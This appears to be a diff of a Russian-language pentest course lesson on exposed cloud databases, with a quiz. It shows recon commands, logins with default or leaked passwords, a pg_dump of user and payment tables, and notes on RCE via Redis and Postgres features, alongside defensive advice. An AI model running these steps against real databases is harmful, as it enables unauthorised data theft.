@@ -14,239 +14,244 @@ useful_for:
 estimated_minutes: 45
 summary: "Как находить публично доступные управляемые базы (RDS, Cosmos DB, Cloud SQL), какие контроли их защищают и как их обходят типовые мисконфиги."
 ---
+## Задача
 
-Managed-базы (RDS, Cosmos DB, Cloud SQL, Azure SQL) — частый источник утечек. Провайдер даёт сетевые контроли, но по умолчанию их легко настроить неправильно. Урок — про обнаружение, эксплуатацию открытых баз и извлечение данных и кредов.
+Объектные хранилища мы разобрали. Теперь — **управляемые базы данных**: RDS (AWS), Cosmos DB (Azure), Cloud SQL (GCP). Это полноценные СУБД, которые облако берёт на сопровождение. Задача: найти публично доступную базу, понять, какие контроли её защищают, и подключиться. Разберём на RDS.
 
-## Типовые конфигурации-мисконфиги
+## Данные: находим базу
 
-| БД | Опасная настройка | Последствие |
-|----|-------------------|-------------|
-| RDS (AWS) | `PubliclyAccessible=true` + SG `0.0.0.0/0` | Прямой доступ из интернета |
-| Cosmos DB (Azure) | firewall `0.0.0.0`–`255.255.255.255` или `Allow Azure services` | Широкий доступ |
-| Cloud SQL (GCP) | public IP + `0.0.0.0/0` в authorized networks | Прямой доступ |
-| Azure SQL | firewall rule `0.0.0.0`–`255.255.255.255` | Широкий доступ |
-| Redis/Mongo self-hosted | нет auth, открытый порт | Полный доступ |
+Смотрим RDS-инстансы в аккаунте:
 
-## Обнаружение
-
-```bash
-# Сканирование диапазонов облаков на порты БД
-nmap -Pn -p 3306,5432,1433,27017,6379,5984,9200 --open <CIDR>
-
-# AWS: найти публичные RDS
-aws rds describe-db-instances \
-  --query "DBInstances[].{ID:DBInstanceIdentifier,Public:PubliclyAccessible,Endpoint:Endpoint.Address}"
-
-# GCP: Cloud SQL с public IP
-gcloud sql instances list --format="table(name,ipAddresses[].ipAddress,settings.ipConfiguration)"
-
-# Azure SQL firewall
-az sql server firewall-rule list -g <RG> -s <SERVER>
+```
+$ aws rds describe-db-instances \
+    --query 'DBInstances[].{id:DBInstanceIdentifier,public:PubliclyAccessible,engine:Engine}'
+[ { "id": "prod-db", "public": true, "engine": "postgres" } ]
 ```
 
-Публичные IP managed-баз часто в диапазонах провайдера (`52.x` AWS, `34.x` GCP и т.п.) — сканируйте и сопоставляйте с DNS.
+`PubliclyAccessible: true` — база получает публичный IP. Это ещё не значит «открыта всем»: доступ режет **security group**. Но публичный endpoint уже половина дела. Смотрим порт и группу:
 
-## Разобранный пример: RDS с открытым security group
-
-1. Сканирование находит открытый 5432 (PostgreSQL).
-2. Пробуем подключиться и перебрать **небольшой** набор дефолтных кредов (не мега-wordlist):
-
-```bash
-psql -h <HOST> -U postgres -c "SELECT version();"
-# популярные: postgres/postgres, admin/admin, root/<пусто>
+```
+$ aws rds describe-db-instances --db-instance-identifier prod-db \
+    --query 'DBInstances[0].{endpoint:Endpoint,sg:VpcSecurityGroups}'
+{
+  "endpoint": { "Address": "prod-db.abc.us-east-1.rds.amazonaws.com", "Port": 5432 },
+  "sg": [ { "VpcSecurityGroupId": "sg-0abc" } ]
+}
 ```
 
-3. Если аутентификация настроена на `trust` или пароль слабый — заходим.
-4. Перечисляем БД и таблицы:
+Проверяем правила security group:
 
-```sql
-\l
-\c appdb
-\dt
-SELECT * FROM users LIMIT 10;
+```
+$ aws ec2 describe-security-groups --group-ids sg-0abc \
+    --query 'SecurityGroups[0].IpPermissions'
+[ { "IpProtocol": "tcp", "FromPort": 5432, "ToPort": 5432,
+    "IpRanges": [ { "CidrIp": "0.0.0.0/0" } ] } ]
 ```
 
-5. Дальше — по методологии БД (см. `svc-database`): чтение файлов, RCE через расширения.
+`0.0.0.0/0` на порт 5432 — база открыта всему интернету. Теперь нужен только пароль.
 
-## Cosmos DB: ключ доступа
+## Пробуем в лоб: подключаемся
 
-Cosmos DB долго имела проблему с **ключом доступа**: строка подключения даёт полный контроль над базой. Утёкший `AccountKey` в коде/логах = полный доступ к данным:
+Сначала проверим доступность:
 
-```bash
-# Строка подключения вида
-# AccountEndpoint=https://acct.documents.azure.com:443/;AccountKey=BASE64==;
+```
+$ pg_isready -h prod-db.abc.us-east-1.rds.amazonaws.com -p 5432
+prod-db.abc.us-east-1.rds.amazonaws.com:5432 - accepting connections
 ```
 
-Также Cosmos поддерживает **аналитическое хранилище** и **RBAC**, но по умолчанию многие используют master key. Ищите строки подключения в коде, CI и логах:
+Порт отвечает. Пробуем **дефолтные/слабые** креды (это разрешено в пентесте, но **не** большой список — только сервисные дефолты и найденные секреты):
 
-```bash
-grep -rE 'AccountEndpoint=|AccountKey=' . --hidden
+```
+$ PGPASSWORD='postgres' psql -h prod-db.abc.us-east-1.rds.amazonaws.com -U postgres -c '\l'
+                                      List of databases
+   Name    |  Owner
+-----------+----------
+ postgres  | postgres
+ appdb     | appadmin
 ```
 
-## Redis/Mongo/Elastic в облаке
+Подошло. База `appdb` — наша.
 
-Не только managed-БД, но и self-hosted на облачных VM:
+## Приём: откуда берутся креды
 
-```bash
-redis-cli -h <HOST> INFO          # открытый Redis
-mongo --host <HOST>               # открытый MongoDB
-curl http://<HOST>:9200/_cat/indices  # Elasticsearch
+Пароль к RDS часто утекает из:
+
+- **Публичных репозиториев** (`.env`, `application.properties`).
+- **Presigned/утёкших конфигов** приложений.
+- **EBS-снапшотов** (см. `cloud-aws-ebs`).
+- **Secrets Manager/SSM** при слабых правах.
+- **CI-переменных** (см. `cloud-gitlab-ci`).
+
+Проверка утёкших кредов в репозитории:
+
+```
+$ gitleaks detect --source . --no-git | grep -i -E 'rds|postgres|password'
+Finding: DB_PASSWORD=Pr0d-DB-P@ss
 ```
 
-Открытый Redis/Mongo — классика (см. `svc-database`), и в облаке такие инстансы встречаются регулярно. Redis без auth → RCE через запись webshell/cron.
+## Полный прогон: от публичного RDS до данных
 
-## Что делать после доступа
+1. **Разведка.** `describe-db-instances` → `PubliclyAccessible: true`.
+2. **Сетевой контроль.** `describe-security-groups` → `0.0.0.0/0` на порт.
+3. **Креды.** Ищем пароль в коде/логах/секретах.
+4. **Подключение.** `psql`/`mysql` с найденными кредами.
+5. **Данные.** Перечисляем базы/таблицы, дампим чувствительное:
 
-Managed-БД — это **хост** в первую очередь:
-
-- OS/версия, права пользователя.
-- Данные: пользователи, токены, PII.
-- **Креды внутри БД**: строки подключения к другим сервисам, API-ключи.
-- Для Postgres — `COPY ... TO PROGRAM` при суперпользователе; для MSSQL — `xp_cmdshell`; для MySQL — UDF.
-- Для облачных БД — проверьте роль/идентичность инстанса (иногда у RDS есть доступ к S3 через роль).
-
-```bash
-# Пример: у RDS есть IAM-роль -> доступ к S3 через нее
-aws rds describe-db-instances --query 'DBInstances[].AssociatedRoles'
 ```
+$ PGPASSWORD=... psql -h prod-db... -U appadmin -d appdb -c '\dt'
+         List of relations
+ Schema |   Name    | Type  | Owner
+--------+-----------+-------+----------
+ public | users     | table | appadmin
+ public | payments  | table | appadmin
+$ PGPASSWORD=... pg_dump -h prod-db... -U appadmin appdb > dump.sql
+```
+
+## Cosmos DB и Cloud SQL
+
+Те же принципы, другие детали:
+
+- **Cosmos DB (Azure).** Ищите `publicNetworkAccess: Enabled` и firewall `0.0.0.0-255.255.255.255`. Публичные базы часто защищены **только** строкой подключения (account key), которая утекает так же.
+
+```
+$ az cosmosdb show -n acme-cosmos -g rg --query '{public:publicNetworkAccess,ip:ipRules}'
+{ "public": "Enabled", "ip": [ { "ipAddressOrRange": "0.0.0.0/0" } ] }
+```
+
+- **Cloud SQL (GCP).** `authorizedNetworks` с `0.0.0.0/0` и публичный IP:
+
+```
+$ gcloud sql instances describe prod-db --format='value(ipAddresses[].ipAddress)'
+34.1.2.3
+$ gcloud sql instances describe prod-db --format='value(settings.ipConfiguration.authorizedNetworks)'
+0.0.0.0/0
+```
+
+## Защита и что ломает атаку
+
+- **Private-only базы** (`PubliclyAccessible: false`, private endpoint).
+- **Security group/firewall только на нужные CIDR.**
+- **IAM-аутентификация** к базе (RDS IAM auth) вместо статического пароля.
+- **Секреты в Secrets Manager** с ротацией.
+- **TLS обязательным** и логирование подключений.
+
+## Если не сработало
+
+- **База приватная** — нужен доступ изнутри VPC (через SSRF/пивот).
+- **Security group узкая** — подключение не пройдёт.
+- **Пароль сильный и не утёк** — брутить большой список нельзя (EV-negative).
+- **IAM-auth** — нужен валидный токен роли.
+
+## Мини-сценарий: от скана порта до дампа
+
+Соберём всё в одну историю.
+
+1. **Скан сети.** Из внутренней сети находим хост `10.0.5.12:5432` (PostgreSQL) и `10.0.5.12:3306` (MySQL) — оба отвечают.
+2. **Определяем, что это RDS.** Баннер и DNS: `prod-db.abc.us-east-1.rds.amazonaws.com`. Управляемая база AWS.
+3. **Смотрим доступность.** С нашего IP `pg_isready` → `accepting connections`. Значит, security group пускает нас.
+4. **Креды.** Ищем пароль в утёкшем репозитории: `gitleaks detect` находит `DB_PASSWORD=Pr0d-DB-P@ss`.
+5. **Подключение.** `psql` с этими кредами → список баз, `\dt` → таблицы `users`, `payments`.
+6. **Дамп.** `pg_dump appdb > dump.sql` — данные у нас.
+7. **Проверка прав.** `SELECT current_user, usesuper FROM pg_user` — возможно, мы `superuser` и можем читать всё.
+
+Ключевой вывод: публичный endpoint и слабый пароль — **две независимые** ошибки, и каждая встречается отдельно. Их сочетание даёт полный доступ к данным.
+
+## Разбор: две ошибки, которые встречаются по отдельности
+
+Публичный endpoint и слабый пароль — независимые ошибки. Публичный RDS с сильным паролем почти безопасен: без кредов подключиться нельзя. Сильный пароль на приватной базе тоже безопасен: до неё не дотянуться снаружи. Опасность возникает, когда обе ошибки складываются — и именно это происходит чаще всего, потому что за сетевой контроль отвечает одна команда, а за секреты — другая. Поэтому защита должна закрывать обе оси: `PubliclyAccessible: false` (или private endpoint) **и** секреты в Secrets Manager с ротацией и IAM-аутентификацией. Проверка одной оси не заменяет проверку другой.
+
+И проверяйте бэкапы: снапшот RDS может быть расшарен так же, как EBS (см. `cloud-aws-ebs`) — данные утекут через бэкап, даже если сама база закрыта.
+
+А ещё включите логирование подключений: необычные источники и частые ошибки аутентификации выдают попытки доступа.
+
+## Что мы теперь знаем
+
+1. Управляемые БД могут быть `PubliclyAccessible`, но решают security group/firewall.
+2. `0.0.0.0/0` на порт БД — открытая база.
+3. Креды утекают из кода, снапшотов, секретов, CI.
+4. Подключение даёт данные и часто привилегии внутри БД.
+5. Защита — приватность, узкие правила, IAM-auth, секреты с ротацией.
 
 ## Частые ошибки
 
-- **Мега-wordlist по сети.** Онлайн-брут на RTT EV-отрицателен; сначала дефолты и утечки, потом — стоп.
-- **Не проверять `PubliclyAccessible` в RDS.** Даже при открытом SG инстанс может быть приватным по флагу.
-- **Забыть про SSL-режим.** Некоторые базы отключают SSL и принимают трафик открыто.
-- **Игнорировать Cosmos master key.** Часто это единственный нужный секрет.
-- **Не смотреть в БД за новыми кредами.** Внутри часто лежат ключи к другим системам.
-- **Путать публичный IP и публичный доступ.** IP может быть, а SG — закрывать порт.
+- **`PubliclyAccessible: true` без необходимости.**
+- **Security group/firewall `0.0.0.0/0`** на порт базы.
+- **Статический пароль вместо IAM-auth.**
+- **Креды в коде/логах/снапшотах** без ротации.
+- **TLS не обязателен** — трафик и креды в открытом виде.
 
-## Что дальше / решение
+## На что смотреть дальше
 
-- Нашли открытый порт БД → пробуйте дефолты, затем стоп.
-- Нашли строку подключения Cosmos → полный доступ к данным.
-- Получили доступ → ищите креды внутри БД и роль инстанса.
-- Смежные уроки: `cloud-storage-s3`, `svc-database`, `cloud-privesc-iam`.
-
-## Инструменты и команды обнаружения
-
-```bash
-nmap -Pn -p 3306,5432,1433,27017,6379,9200 <target>
-nc -nv <target> 6379 <<< "INFO"
-redis-cli -h <target> INFO
-mongosh --host <target> --eval 'db.adminCommand({listDatabases:1})'
-psql "host=<target> user=postgres dbname=postgres"
-mysql -h <target> -u root -p''
-```
-
-## Cosmos DB: ключ доступа
-
-Cosmos DB имеет primary/secondary key, дающий полный доступ. Ключ часто лежит в App Service/Functions config. Извлечение и использование:
-
-```bash
-az cosmosdb keys list --name db --resource-group rg --type keys
-# с ключом — доступ к данным через SDK/REST
-```
-
-Если у Cosmos включён доступ по ключу, а ключ утёк (или доступен через SSRF) — это полный доступ к базе, включая запись.
-
-## Разобранный пример 2: RDS с открытым SG
-
-1. Security group разрешает `0.0.0.0/0` на 3306.
-2. `nmap` подтверждает открытый порт.
-3. Подбор слабого пароля (admin/admin, root/root) — малый набор.
-4. Вход, `SHOW DATABASES`, поиск PII и хешей.
-5. Проверка прав: `SELECT user,host FROM mysql.user`.
-6. Проверка на FILE-привилегию → запись файла (UDF → RCE).
-
-## Защита
-
-- Приватные endpoint, security groups с белыми списками.
-- IAM-аутентификация вместо паролей.
-- Шифрование, ротация секретов.
-- Аудит доступа (RDS Enhanced Monitoring, Cosmos diagnostics).
-
-## Практическое задание
-
-Поднимите MySQL в Docker с открытым портом и слабым паролем. Подключитесь, выгрузите данные, проверьте привилегии. Затем ограничьте доступ и убедитесь, что подключение пропало. Это базовый навык работы с открытыми БД.
-
-## Redis/Mongo/Elastic в облаке
-
-Открытые Redis (6379) без пароля дают `CONFIG SET dir`/`dbfilename` → запись файла → RCE. MongoDB (27017) без auth — полный дамп. Elasticsearch (9200) — данные и потенциальный RCE через скрипты. В облаке они часто стоят за security group, но при мисконфиге доступны из интернета. Проверяйте `redis-cli INFO`, `mongosh` и `curl :9200/_cat/indices`.
-
-## Чек-лист работы с открытой БД
-
-1. Подтвердить доступ (баннер, `SELECT 1`, `PING`).
-2. Определить тип и версию.
-3. Проверить UNAUTH-режим (Redis/Mongo) — вход без пароля.
-4. Малый набор default-кред (root/root, admin/admin, postgres/postgres).
-5. Перечислить базы, таблицы, найти PII и хеши.
-6. Проверить привилегии (FILE, xp_cmdshell, COPY TO PROGRAM).
-7. Оценить RCE-путь, зафиксировать доказательства.
-8. Не изменять данные без необходимости.
-
-## Проверка UNAUTH и слабых паролей
-
-Сначала проверьте доступ без пароля (Redis `PING`, Mongo `db.runCommand({ping:1})`, Elastic `GET /`). Затем — малый набор default-кред. Никогда не используйте большой словарь онлайн: это EV-отрицательно. Если три попытки не сработали — зафиксируйте «hardened» и переходите дальше. Для RDS проверьте публичную доступность: `nslookup <endpoint>` должен давать приватный IP.
+- `PubliclyAccessible` / `publicNetworkAccess`.
+- Security group/firewall: есть ли `0.0.0.0/0`.
+- Креды в репозиториях, логах, секретах, снапшотах.
+- Включена ли IAM-аутентификация.
+- Обязателен ли TLS.
 
 ## Быстрая проверка
 
 ```bash
-nmap -Pn -p 3306,5432,14337,27017,6379,9200 <target>
-redis-cli -h <target> PING
-mongosh --host <target> --eval 'db.adminCommand({ping:1})'
-curl -s http://<target>:9200/_cat/indices
+aws rds describe-db-instances --query 'DBInstances[].{id:DBInstanceIdentifier,p:PubliclyAccessible}'
+aws ec2 describe-security-groups --group-ids sg-0abc --query 'SecurityGroups[0].IpPermissions'
+gcloud sql instances describe prod-db --format='value(settings.ipConfiguration.authorizedNetworks)'
+az cosmosdb show -n acme-cosmos -g rg --query publicNetworkAccess
 ```
-
-UNAUTH-доступ — первая и главная проверка. Затем — малый набор default-кред. Три неудачи → фиксируйте «hardened» и двигайтесь дальше.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какой флаг RDS делает инстанс доступным из интернета при открытом security group?"
+- question: "Что означает PubliclyAccessible: true у RDS?"
   options:
-    - "MultiAZ"
-    - "PubliclyAccessible=true"
-    - "StorageEncrypted"
-    - "DeletionProtection"
-  answer: 1
-  explanation: "PubliclyAccessible определяет, получит ли инстанс публичный IP."
-- question: "Что даёт утёкший AccountKey Cosmos DB?"
+    - "База получает публичный IP; доступ режет security group"
+    - "База открыта всем без пароля"
+    - "База зашифрована"
+    - "База удалена"
+  answer: 0
+  explanation: "Публичный endpoint, но доступ по security group."
+- question: "Какое правило security group делает базу открытой миру?"
   options:
-    - "Только чтение метаданных"
-    - "Полный доступ к базе данных"
-    - "Только биллинг"
-    - "Ничего"
-  answer: 1
-  explanation: "Master key даёт полный контроль над Cosmos DB."
-- question: "Какая стратегия перебора кредов правильная для сетевой БД?"
+    - "0.0.0.0/0 на порт базы"
+    - "10.0.0.0/8 на порт"
+    - "Отсутствие правил"
+    - "Только ICMP"
+  answer: 0
+  explanation: "0.0.0.0/0 разрешает всех."
+- question: "Откуда чаще всего утекает пароль к managed-БД?"
   options:
-    - "Мега-wordlist rockyou"
-    - "Небольшой набор: дефолты, найденные в утечках, популярные"
-    - "Без пароля вообще"
-    - "Только брут по SSH"
-  answer: 1
-  explanation: "Онлайн-брут на RTT неэффективен; сначала дефолты и утечки, затем стоп."
-- question: "Почему managed-БД нужно рассматривать как хост?"
+    - "Из кода, CI-переменных, снапшотов и секретов"
+    - "Из DNS"
+    - "Из TLS-сертификата"
+    - "Из IAM-политики"
+  answer: 0
+  explanation: "Пароли утекают из конфигов и хранилищ."
+- question: "Чем IAM-аутентификация лучше статического пароля?"
   options:
-    - "Потому что она виртуальная"
-    - "Потому что внутри есть ОС, права, данные и часто новые креды"
-    - "Потому что у неё нет ОС"
-    - "Потому что она не логируется"
-  answer: 1
-  explanation: "База — это система с ОС и данными, из которой можно двигаться дальше."
-- question: "Где в GCP настраивается список сетей, которым разрешён доступ к Cloud SQL?"
+    - "Использует временный токен роли, пароль не хранится"
+    - "Она быстрее"
+    - "Она шифрует базу"
+    - "Она отключает логи"
+  answer: 0
+  explanation: "IAM-auth убирает статический секрет."
+- question: "Что делать, если база приватная?"
   options:
-    - "security group"
-    - "authorized networks в ipConfiguration"
-    - "Route 53"
-    - "IAM role"
-  answer: 1
-  explanation: "Cloud SQL использует authorized networks в настройках ipConfiguration."
+    - "Искать доступ изнутри VPC (SSRF/пивот)"
+    - "Сразу брутить"
+    - "Удалить базу"
+    - "Сменить регион"
+  answer: 0
+  explanation: "Приватную базу достают изнутри сети."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-exfiltration`) мы разберём, как выводят данные из облака и как этому мешает egress-контроль. А пока главное: публичная база — это публичный endpoint плюс слабые креды, и оба элемента часто находят по отдельности.
 
 ## Где пригодится
 
-- **Bug bounty** — открытые БД, утечки данных.
-- **Пентест** — оценка сетевой экспозиции managed-сервисов.
-- **IR/Blue team** — расследование утечек через базы.
-- **DevSecOps** — аудит firewall и public access.
-- **Сертификации** — облачные security-сертификаты.
+- **Bug bounty:** публичные RDS/Cosmos/Cloud SQL.
+- **Red team:** от открытой базы к данным.
+- **Пентест:** аудит managed-БД.
+- **Работа/DevSecOps:** private-only, узкие правила, IAM-auth, ротация.
+- **Дальше по дереву:** `cloud-rds-aurora`, `cloud-database-exposure`.
